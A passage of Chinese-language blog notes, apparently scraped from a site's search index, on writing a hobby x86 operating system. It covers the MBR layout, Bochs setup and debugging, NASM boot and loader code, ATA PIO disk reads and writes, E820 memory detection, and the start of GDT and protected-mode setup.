使用KmdManager 使用windbg x64调试 File -&gt; Kernel Debug F5继续过后在虚拟机里面运行","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"操作系统实现-合集1","slug":"os-allinone","date":"2022-08-24T12:00:00.000Z","updated":"2023-06-01T14:25:24.449Z","comments":true,"path":"2022/08/24/os-allinone/","link":"","permalink":"https://joe1sn.eu.org/2022/08/24/os-allinone/","excerpt":"代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 后来觉得操作系统从0到1这样学是一个非常蠢得概念，因为每个人学习他应该是有重点地。对系统有个基础的认知后，就该去精通自己要专注的方向，比如内存管理、网络协议等 也有可能你只是为了面试，但是面试也是有重点的对吧 所以把之前的文章做一个合集，喜欢在认识系统后再在方面创造子系统","text":"代码来源：https://github.com/StevenBaby/onix 相关课程：https://www.bilibili.com/video/BV1gR4y1u7or 感谢B站UP：踌躇月光 带来的相关代码和教程 后来觉得操作系统从0到1这样学是一个非常蠢得概念，因为每个人学习他应该是有重点地。对系统有个基础的认知后，就该去精通自己要专注的方向，比如内存管理、网络协议等 也有可能你只是为了面试，但是面试也是有重点的对吧 所以把之前的文章做一个合集，喜欢在认识系统后再在方面创造子系统 [操作系统实现]基础篇 CPU中的段寄存器 CS (Code Segment Register)：代码段的段基址 DS(Data Segment Register)：数据段的段基址 ES(Extra Segment Register)：其值为附加数据段的段基值，称为“附加”是因为此段寄存器用途不像其他 sreg 那样固定，可以额外做他用。 FS(Extra Segment Register)：其值为附加数据段的段基值 GS：同上 SS(Stack Segment Register)：堆栈段寄存器 在实模式中，CS、DS、ES、SS中的值是物理地址 在保护模式中，装入寄存器的是段选择子 BIOS DOS Linux中断的区别 BIOS、DOS都是在 实模式 中运行，有内部中断向量表(Interrupt Vector Table IVT)建立，用过INT掉用实现 BIOS 中断调用的主要功能是提供了硬件访问的方法，该方法使对硬件的操作变得简单易行 BIOS 在运行期间会扫描 0xc0000 0xe0000 之间的内存，若在某个区域发现前两个 节是 Ox55 OxAA 时，这意味着该区域对应的 rom 中有代码存在，再对该区域做累加和检查，若结果与第3个字节的值相符，说明代码无误，就从第4个字节进入 Linux 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表己经不存在了， 取而代之的是中断描述符表(Interrupt Descriptor Table, IDT)。 Linux 是通过 int 0x80 指令进入一个中断程序后再根据 缸寄存器的值来调用不同的子功能函数的 Section与Segment的区别 section 称为节，是指在汇编源码中经由关键字 section segment 修饰、逻辑划分的指令或数据区域， 汇编器会将这两个关键字修饰的区域在目标文件中编译成节，也就是说“节”最初诞生于目标文件中 segment 称为段，是链接器根据目标文件中属性相同的多个 section 合并后的 section 集合，这个集合 称为 segment ，也就是段，链接器把目标文件链接成可执行文件，因此段最终诞生于可执行文件中 不管定义了多少节名，最终要把属性相同的 section ，或者编译认为可以放到一块的，合并到一个大的 segment 中，也就是 elf 中说的 program header 中的项 MBR 、EBR、DBR、OBR是什么 MBR 是主引导记录(Main Boot Record)，存在与磁盘开始，扇区大小为512字节 446 字节的引导程序及参数： 64字节分区表 2字节结束标记：\\x55\\xaa OBR 内核加载器，存在于操作系统引导扇区，是操作系统引导程序(OS Boot Record) DBR Dos Boot Record MBR跳转引导指令 厂商信息、DOS版本模块 BIOS参数块BPB OBR 结束标记 \\x55\\xaa EBR Extra Boot Record，解决分区数量限制同时兼容MBR MBR EBR 是分区工具创建维护的，不属于操作系统管理的范围 grub multiboot 0x7c00 IBM PC 5150 DOS 1.0 [操作系统实现]MBR 一些问题 BIOS固定入口地址：0xFFFF0，此时CPU中的cs:ip为 0xF000:0xFFF0（实模式下cs要左移4位再相加） ？为什么是0x7C00 MBR程序是在内存的0x7c00中运行的，DOS1.0中的最小内存为32KB，所以选择最后1KB合理，32KB=0x8000B，1KB=0x400，所以程序开始是0x8000-0x100=0x7c00 如何找到系统调用相关说明 IBM PS 2 and PC BIOS Interface Technical Reference 主引导扇区结构 代码大小：446B 硬盘分区表：64B=4*16B magic_num：0xaa55 - 0x55 0xaa 主要功能 ​ 读取内核加载其并执行 实验 按照书上配置好环境 配置文件 123456789101112131415161718192021222324252627#Bochs运行中使用的内存，设置为32Mmegs: 32#设置真实机器的BIOS和VGA BIOS#修改成你们对应的地址romimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/BIOS-bochs-latestvgaromimage: file=/home/joe1sn/Desktop/real_os/bochs/share/bochs/VGABIOS-lgpl-latest#设置Bochs所使用的磁盘#设置启动盘符boot: disk#设置日志文件的输出log: bochs.out#开启或关闭某些功能，修改成你们对应的地址mouse: enabled=0keyboard:keymap=/home/joe1sn/Desktop/real_os/bochs/share/bochs/keymaps/x11-pc-us.map#硬盘设置ata0: enabled=1, ioaddr1=0x1f0, ioaddr2=0x3f0, irq=14ata0-master: type=disk, path=&quot;hd60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63#ata0-master: type=disk, path=&quot;gp60M.img&quot;, mode=flat, cylinders=121, heads=16, spt=63#增加bochs对gdb的支持，我们在这里不使用，所以注释掉了#gdbstub: enabled=1, port=1234, text_base=0, data_base=0, bss_base=0 源代码 12345678910111213141516171819202122232425262728293031323334353637;MBR;--------------------------------SECTION MBR vstart=0x7c00; mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00;使用6上卷屏幕，实现清屏;------------------------------------------------------- mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;;;;; 得到光标位置 mov ah, 3 ;3号功能是获取光标位置 mov bh, 0 ;存储带获取光标的页号 int 0x10;;;;; 打印字符串 mov ax, message mov bp, ax mov cx, 5 mov ax, 0x1301 mov bx, 0x2 int 0x10 jmp $ ;pause message db &quot;MetOS&quot;;要打印的字符串 times 510-($-$$) db 0 db 0x55,0xaa 编译 1nasm -o mbr.bin mbr.asm 设置基础BOCHS硬盘 1./bin/bximage -hd -mode=&quot;flat&quot; -size=60 -q hd60M.img ata0-master: type=disk, path=“master.img”, mode=flat, cylinders=121, heads=16, spt=63 按照格式写入硬盘文件 1dd if=./mbr.bin of=/home/joe1sn/Desktop/real_os/bochs/hd60M.img bs=512 count=1 conv=notrunc 使用显卡显示 IA32 体系系统中，因为用于存储端口号的寄存器是 16 位的，所以最大有 65536 个端口，即 65535 要是通过内存映射，端口就可以用 mov 指令来操作。但由于用的是独立编址，所以就不能把它当作内存来操作，因此 CPU 提供了专门的指令来干这事，in和out in用于读数据 out用于写数据 外部设备BIOS是：0xC000道0xCFFF 显存是0xB8000到0xBFFFF 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445;Main Bootloader Program;--------------------------------SECTION MBR vstart=0x7c00 mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00 mov ax,0xb800 mov gs,ax;clear screen using int_6;-----------------------------------------------------------;INT 0x10 function_code:6 funcion:uproll the screen;-----------------------------------------------------------;INPUT mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;using gpu mov byte [gs:0x00],&#x27;M&#x27; mov byte [gs:0x01],0x04 ;green back_flash mov byte [gs:0x02],&#x27;e&#x27; mov byte [gs:0x03],0x04 mov byte [gs:0x04],&#x27;l&#x27; mov byte [gs:0x05],0x04 mov byte [gs:0x06],&#x27;t&#x27; mov byte [gs:0x07],0x04 mov byte [gs:0x08],&#x27;O&#x27; mov byte [gs:0x09],0x04 mov byte [gs:0x0a],&#x27;S&#x27; mov byte [gs:0x0b],0x04 jmp $ ;pause times 510-($-$$) db 0 db 0x55,0xaa BOCHS调试 Debug Control q|quit|exit set show show mode 每次CPU变换模式提醒 show int 每次中断时提醒 show call 函数调用时提醒 u|disasm [/num] [start] [end] ​ 反汇编 start到end代码，num是反汇编指令数 Execution control c| cont| continue s| step [count] p| n| next Breakpoint management vb| vbreak 按照虚拟地址下断点 lb| break[addr]线性地址添加断点 pb| pbreak| b| break [addr] 物理地址添加断点 sb [delta] delta 表示再执行delta条指令程序就中断 watch unwatch blist 显示所有断点信息 bpd| bpe [n]禁用断点 d| del| delete[n] 删除某断点 MBR使用硬盘-交出控制权 MBR 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117;Main Bootloader Program;--------------------------------%include &quot;boot.inc&quot;SECTION MBR vstart=0x7c00 mov ax,cs mov ds,ax mov es,ax mov ss,ax mov fs,ax mov sp,0x7c00 mov ax,0xb800 mov gs,ax;clear screen using int_6;-----------------------------------------------------------;INT 0x10 function_code:6 funcion:uproll the screen;-----------------------------------------------------------;INPUT mov ax, 0x600 mov bx, 0x700 mov cx, 0 mov dx, 0x184f int 0x10;using gpu mov byte [gs:0x00],&#x27;M&#x27; mov byte [gs:0x01],0x04 ;green back_flash mov byte [gs:0x02],&#x27;e&#x27; mov byte [gs:0x03],0x04 mov byte [gs:0x04],&#x27;l&#x27; mov byte [gs:0x05],0x04 mov byte [gs:0x06],&#x27;t&#x27; mov byte [gs:0x07],0x04 mov byte [gs:0x08],&#x27;O&#x27; mov byte [gs:0x09],0x04 mov byte [gs:0x0a],&#x27;S&#x27; mov byte [gs:0x0b],0x04 mov eax,LOADER_START_SECTOR ;起始扇区lba地址 mov bx,LOADER_BASE_ADDR ;写入磁盘的地址 mov cd,1 ;代读入的扇区数 call rd_disk_m_16 jmp LOADER_BASE_ADDR;读取硬盘的第n个扇区rd_disk_m_16:; eax=LBA扇区号; ebx=将数据写入的内存地址; ecx=读入的扇区数 mov esi,eax ;备份eax mov di,cx ;备份cx;读写硬盘;------S1:设置要读取扇区数 mov dx,0x1f2 mov al,cl out dx,al ;代读取的扇区数 mov eax,esi ;恢复ax;------S2:将LBA地址写入0x1f3-0x1f6 ;LBA 地址7-0位写入端口 0x1f3 mov dx,0x1f3 out dx,al ;LBA 地址15-8 位写入端口 0x1f4 mov cl,8 shr eax,cl mov dx,0x1f4 out dx,al ;LBA 地址23-16 位写入端口 0x1f5 shr eax,cl mov dx,0x1f5 out dx,al shr eax,cl and al,0x0f ;LBA 24-27 bits or al,0xe0 ;set 7-4 = 1110，表示LBA模式 mov dx,0x1f6 out dx,al;------S3:0x1f7端口写入读命令,0x20 mov dx,0x1f7 mov al,0x20 out dx,al;------S4:检测硬盘状态 .not_ready: nop in al,dx and al,0x88 ;第4位为1表示硬盘控制器已准备好数据传输，第7位为1表示硬盘忙 cmp al,0x08 jnz .not_ready;------S5:从0x1f0读取数据 mov ax,di mov dx,256 mul dx mov cx,ax mov dx,0x1f0 .go_on_ready: in ax,dx mov [bx],ax add bx,2 loop .go_on_ready ret ;jmp $ ;pause times 510-($-$$) db 0 db 0x55,0xaa 宏LOADER_START_SECTOR就是0x2，表示我们要向磁盘第三个扇区（第一个是0x0）读loader，LOADER_BASE_ADDR就是loader被写入的地址0x900。 Loader 12345678910111213141516171819202122232425262728%include &quot;boot.inc&quot;section loader vstart=LOADER_BASE_ADDRmov byte [gs:0x00] ,&#x27;2&#x27;mov byte [gs:0x01] ,0xA4mov byte [gs:0x02] ,&#x27; &#x27;mov byte [gs:0x03] ,0xA4mov byte [gs:0x04] ,&#x27;L&#x27;mov byte [gs:0x05] ,0xA4mov byte [gs:0x06] ,&#x27;o&#x27;mov byte [gs:0x07] ,0xA4mov byte [gs:0x08] ,&#x27;a&#x27;mov byte [gs:0x09] ,0xA4mov byte [gs:0x0a] ,&#x27;d&#x27;mov byte [gs:0x0b] ,0xA4mov byte [gs:0x0c] ,&#x27;e&#x27;mov byte [gs:0x0d] ,0xA4mov byte [gs:0x0e] ,&#x27;r&#x27;mov byte [gs:0x0f] ,0xA4jmp $ 编译后写入第二扇区 1dd if=./MBR/loader.bin of=/home/joe1sn/Desktop/real_os/bochs/disk60M.img bs=512 count=1 seek=2 conv=notrunc 总结 **1.MBR执行流程 ** 从内存最低1KB位置出发，调用BIOS的中断向量表实现 2.使用外部IO设备 每个设备在CPU实模式中有内存和端口，按照内存访问+向量表调用可以实现 3.使用IO启动 开始和之前相同 ​ 第1步：设置要读取的扇区数 ​ 第2步：将LBA地址存入0x1f3 ~ 0x1f6 ​ 第3步：向0x1f7端口写入读命令，0x20 ​ 第4步：检测硬盘状态 ​ 第5步：从0x1f0端口读数据 先选择通道，往该通道的 sector count 寄存器中写入待操作的扇区数 往该通道上的三个 LBA 寄存器写入扇区起始地址的低 24 位 往 device 寄存器中写入 LBA 地址的 24-27 位，并置第6位为1，使其为 LBA 模式，设置第4位，选择操作的硬盘（master 硬盘或 slave 硬盘） 往该通道上的 command 寄存器写入操作命令 读取该通道上的 status 寄存器，判断硬盘工作是否完成 如果以上步骤是读硬盘，进入下 个步骤。否则，完工 将硬盘数据读出 数据传送的方式就是操作系统学的了 [操作系统实现]从usb启动 首先把usb插入ubuntu查看 1lsblk #查看挂载 格式化usb 1sudo fdisk /dev/sdb d：删除分区 可以写makefile如下： 1234567891011121314151617181920212223boot.bin: boot.asm nasm -f bin boot.asm -o boot.binmaster.img: boot.bin yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q master.img dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc.PHONY: cleanclean: rm -rf *.bin rm -rf *.img.PHONY: usbusb: boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bin.PHONY: bochsbochs: master.img bochs -q 源代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00; xchg bx, bx; bochs魔数断点mov si, bootingcall print;程序悬停jmp $print: mov ah, 0xe.next: mov al, [si] cmp al, 0 jz .done int 0x10 inc si jmp .next.done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;填充times 510-($-$$) db 0db 0x55,0xaa 弹出过后从VMware创建新的虚拟机启动 注：要在插入usb后启动vmware，否则vmware无法识别到usb [操作系统实现]实模式下的print实现 参数： ah：0xe al：字符 int 0x10： 系统调用 函数 1234567891011print: mov ah, 0xe ;功能参数.next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个.done: ret 完整代码 1234567891011121314151617181920212223242526272829303132333435363738394041[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00xchg bx, bx; bochs魔数断点mov si, bootingcall print;程序悬停jmp $print: mov ah, 0xe ;功能参数.next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个.done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;填充times 510-($-$$) db 0db 0x55,0xaa make bochs编译 [操作系统实现]硬盘读写 简单的磁盘结构 扇区：硬盘读写的最小单位，最多256，最小1个 性能瓶颈：机械臂的寻道时间 一般磁道有63个扇区（由于BIOS最大支持） 一般外侧读写速度最快 IDE / ATA PIO Mode PIO：Port Input Output Port更多指的是外部设备内部的寄存器 IDE：Intergrated Drive Electronics 集成电子驱动器 （西部数据） ATA（PATA）：Advanced Technology Attachment（ANSI标准） SATA 硬盘读写模式 CHS： Cylinder / Head / Sector | 柱面 / 磁道 / 扇区 LBA： Logical Block Address | 逻辑块地址 LBA28：总共访问 128G的磁盘空间 两个通道：Primary Secondary 0x1F0：16bits，用于读写数据 0x1F1：用于检测前一个指令的错误 0x1F2：读写扇区的数量，最多256 0x1F3：起始扇区 0 ~ 7 位 0x1F4：起始扇区 8~15 位 0x1F5：起始扇区 16 ~ 23 位 0x1F6： 0 ~ 3：起始扇区 24 ~ 27 位 4：0–&gt;master主盘；1–&gt;slave从盘 6：0 CHS模式；1 LBA模式 5、7：固定 1 0x1F7： out操作 0xEC：识别硬盘 0x20：读硬盘 0x30：写硬盘 int操作 0 ERROR 3 DRQ 数据准备完毕 7 BSY 硬盘繁忙 源代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00mov edi, 0x1000 ; 读到的目标内存mov ecx, 0 ; 起始扇区mov bl,1 ;扇区数量call read_diskxchg bx, bx; bochs魔数断点mov edi, 0x1000 ; src的目标内存mov ecx, 2 ; 起始扇区mov bl,1 ;扇区数量call write_diskmov si, bootingcall print;程序悬停jmp $;读取硬盘read_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x20;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .read: push cx;保存cx call .waits;等待数据准备完毕 call .reads;读取一个扇区 pop cx loop .read ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_1000; 与操作，只剩下3,7位 cmp al, 0b0000_1000; 比较3,7位，确保硬盘准备就绪 jnz .check ret .reads: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .readw: in ax, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; mov [edi], ax add edi, 2 loop .readw ret;写硬盘write_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x30;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .write: push cx;保存cx call .writes;写一个扇区 call .waits;等待繁忙 pop cx loop .write ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_0000; 与操作，只剩下7位 cmp al, 0b0000_0000; 比较7位，确保硬盘准备就绪 jnz .check ret .writes: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .writew: mov ax, [edi] out dx, ax jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; add edi, 2 loop .writew ret;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\r;填充times 510-($-$$) db 0db 0x55,0xaa 操作系统实现-内核加载器 基本步骤 写内核加载器 loader 将loader加载到硬盘 在主引导扇区读入 检测正确性 x86实模式下内存布局 假设我们的bootloader如下 12345678910111213141516171819202122[org 0x1000];实模式下的其实地址dw 0x55aa; 魔数，用于判断错误mov si,loadingcall printjmp $print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retloading: db &quot;Kernel Booting Up...&quot;,10,13,0 这是可以修改下makefile文件 1234567891011121314151617181920212223242526%.bin: %.asm nasm -f bin $&lt; -o $@master.img: boot.bin loader.bin yes | bximage -hd -mode=&quot;flat&quot; -size=60 -q master.img dd if=./boot.bin of=master.img bs=512 count=1 conv=notrunc dd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc.PHONY: cleanclean: rm -rf *.bin rm -rf *.img.PHONY: usbusb: boot.bin /dev/sdb sudo dd if=/dev/sdb of=tmp.bin bs=512 count=1 conv=notrunc cp tmp.bin usb.bin sudo rm tmp.bin dd if=boot.bin of=usb.bin bs=446 count=1 conv=notrunc sudo dd if=usb.bin of=/dev/sdb bs=512 count=1 conv=notrunc rm usb.bin.PHONY: bochsbochs: master.img bochs -q 这样我们使用make loader.bin就能生成loader.bin了 同时：dd if=./loader.bin of=master.img bs=512 count=4 seek=2 conv=notrunc将loader写到第二扇区，写512*4字节大小 接着我们修改主程序，逻辑如下 读取第二扇区到实模式下的可用内存并验证&quot;\\x55\\xaa&quot;校验位 jmp到内存执行 得到新的boot.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213[org 0x7c00];最简单的主程序引导程序;实模式的启动地址;设置屏幕模式为文本模式，清除屏幕mov ax,3int 0x10;初始化段寄存器mov ax,0mov ds,axmov es,axmov ss,axmov sp,0x7c00mov si, bootingcall printmov edi, 0x1000 ; 读到的目标内存mov ecx, 2 ; 起始扇区mov bl,4 ;扇区数量call read_diskcmp word [0x1000], 0x55aajnz errorjmp 0:0x1002;程序悬停jmp $;读取硬盘read_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x20;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .read: push cx;保存cx call .waits;等待数据准备完毕 call .reads;读取一个扇区 pop cx loop .read ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_1000; 与操作，只剩下3,7位 cmp al, 0b0000_1000; 比较3,7位，确保硬盘准备就绪 jnz .check ret .reads: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .readw: in ax, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; mov [edi], ax add edi, 2 loop .readw ret;写硬盘write_disk: ;设置读写扇区数量 ;0x1f2端口=1 mov dx, 0x1f2 mov al, bl out dx, al ;----------------------------------------- ;0x1f3端口= 00000000 inc dx; 0x1f3 mov al, cl ;起始扇区的前8位 out dx, al ;0x1f4端口= 00000000 inc dx; 0x1f4 shr ecx, 8 mov al, cl ;起始扇区的中8位 out dx, al ;0x1f5端口= 00000000 inc dx; 0x1f5 shr ecx, 8 mov al, cl ;起始扇区的高8位 out dx, al ;起始扇区24位：00000000_00000000_00000000 ;----------------------------------------- inc dx;0x1f6 shr ecx, 8 and cl, 0b1111;高4位置0 mov al, 0b1110_0000; or al, cl; cl拼接到al后面 out dx, al;主盘 LBA模式设置 ;0x1f7端口= 0x20;表示读硬盘 inc dx;0x1f7 mov al,0x30;读硬盘 out dx,al xor ecx, ecx;清空exc mov cl, bl;得到读写扇区的数量 .write: push cx;保存cx call .writes;写一个扇区 call .waits;等待繁忙 pop cx loop .write ret .waits: mov dx, 0x1f7 .check: in al, dx jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; and al, 0b1000_0000; 与操作，只剩下7位 cmp al, 0b0000_0000; 比较7位，确保硬盘准备就绪 jnz .check ret .writes: mov dx, 0x1f0 mov cx, 256;一个扇区是256字 .writew: mov ax, [edi] out dx, ax jmp $+2; nop等价，直接跳下一行 jmp $+2; 制造一点点延迟 jmp $+2; add edi, 2 loop .writew ret;实模式的打印print: mov ah, 0xe ;功能参数 .next: mov al, [si];字符 cmp al, 0 ;判断是否为最后一个结尾 jz .done ;结尾跳转至ret int 0x10 ;功能调用 inc si ;地址-1 jmp .next ;继续，下一个 .done: retbooting: db &quot;Booting Xsys...&quot;,10,13,0; \\n\\rerror: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0;填充times 510-($-$$) db 0db 0x55,0xaa 同时可以修改loader.asm的校验位，查看报错是否正常 更改loader.bin的时候要重新make master.img让新的loader.bin写入磁盘文件 操作系统实现-内存检测 实模式下在进入保护模式之前要检测内存是否能够被使用，并且更好的规划内存空间。 如何实现内存检测 BIOS的int 0x15调用、0xe820子功能号、20B的ards(Address Range Descriptor Structure)结构体大小 BIOS会返回一个ards结构体到指定的ards_buffer中，结构体内容如图 其中的Type字段是用来描述这段内存的类型，这里所谓的类型是说明这段内存的用途，是可以被操作系统使用，还是保留起来不能用 Type值 名称 含义 1 AddressRangeMemory 该内存可以被操作系统使用 2 AddressRangeReserved 内存使用中，或被系统保留，操作系统不能使用 其他 undefine 未定义 源代码实现 在boot中添加loader失败语句 123456error: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Failed&quot;,10,13,0 在loader最后结尾定义ards_count与ards_buffer 123ards_count: dw 0ards_buffer: 在loader中编写内存启动程序 具体调用情况如下 123456789101112131415161718192021222324252627282930313233343536373839detect_mem: xor ebx, ebx mov ax, 0 mov es, ax;es:di结构体缓存位置 mov edi, ards_buffer;结构体内存位置 mov edx, 0x534d4150;SMAP签名.next: mov eax, 0xe820 ;子功能号 mov ecx, 20 ;ards结构体大小，单位：字节 int 0x15 ;调用0x15内存检测功能 ;若CF=1，则表示出错 jc error ;否则将缓存指针指向下一个结构体 add di, cx inc word [ards_count] ;将结构体数量+1 cmp ebx, 0 ;0为检测结束 jnz .next mov si, detecting call print; mov cx, [ards_buffer] ;结构体数量; mov si, 0 ;结构体指针; .show:; mov eax, [si + ards_buffer]; mov ebx, [8 + si + ards_buffer]; mov edx, [16 + si + ards_buffer]; add si,20; xchg bx,bx; loop .show ;loop是根据cx的值循环jmp $ 写loader报错和内存检测完成功能 123456789detecting: db &quot;Detecting Memeory Success...&quot;,10,13,0 error: mov si, .msg call print hlt; CPU停止 jmp $ .msg db &quot;Kernel Booting Error&quot;,10,13,0 激活.show那段被注释的代码可以在bochs调试看到每次调用返回地ARDS结构体内容 参考 x86的E820h子功能 一步步编写操作系统 33 利用bios中断0x15子功能0xe820获取内存 操作系统实现-保护模式与全局描述符 8086 1M 内存，实模式，可以完全控制计算机 80286 保护模式 16位 保护模式 IT 寄存器 Register / 有些寄存器只能操作系统使用 高速缓存 Cache 内存 / 描述符 外部设备 / 硬盘 int/out 全局描述符 80386 描述符 全局描述符表 GDT 1descriptor gdt[8192]; 0 必须全为 0-null 描述符 8191 通用 12lgdt [gdt_ptr]; //load gdtsgdt [gdt_ptr]; // save gdt 段选择子 只需要一个代码段 需要一个或多个段 加载到段寄存器中 / 校验特权等级 123456typedef struct selector&#123; unsigned char RPL :2; unsigned char TI :1; //local descriptor table unsigned short index :13;&#125; __attribute__((packed)) selector; cs / ds / es /gs fs / gs A20线 参考第一篇文章，来源于8086最开始只有20条地址线 打开是修改0x92端口 PE Protect Enable cr0寄存器 0 位 置 1 loader.asm 准备工作，定义一些常量 1234567891011121314151617181920212223242526272829code_selector equ (1&lt;&lt;3);代码段选择子data_selector equ (2&lt;&lt;3);数据段选择子memeory_base equ 0;内存起始地址 基地址memeory_limit 